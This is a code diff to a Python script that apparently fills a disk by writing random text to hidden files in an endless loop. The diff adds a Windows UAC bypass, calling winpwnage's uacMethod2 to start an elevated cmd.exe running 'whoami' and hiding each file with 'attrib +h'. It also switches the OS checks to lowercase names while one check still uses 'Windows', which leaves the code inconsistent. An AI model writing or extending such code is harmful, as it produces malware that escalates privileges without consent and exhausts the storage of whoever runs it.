@@ -3,6 +3,7 @@ import string
 import random
 import platform
 import multiprocessing as mp
+from winpwnage.functions.uac.uacMethod2 import uacMethod2
 
 
 os.system("cls" if os.name == "nt" else "clear")
@@ -18,9 +19,9 @@ def tff():
 
 
 def change_os():
-    if os_name == "Windows":
-        return "C:/Users/Public/"
-    elif os_name == "Linux":
+    if os_name == "windows":
+        return "C:"
+    elif os_name == "linux":
         return "./"
     else:
         print("Platform not supported.")
@@ -32,6 +33,7 @@ def write_file(i):
     
     with open(filename, "w", buffering=CSZE * 100) as file:
         if os_name == "Windows":
+            uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
             os.system("attrib +h " + filename)
         while True:
             text = tff()
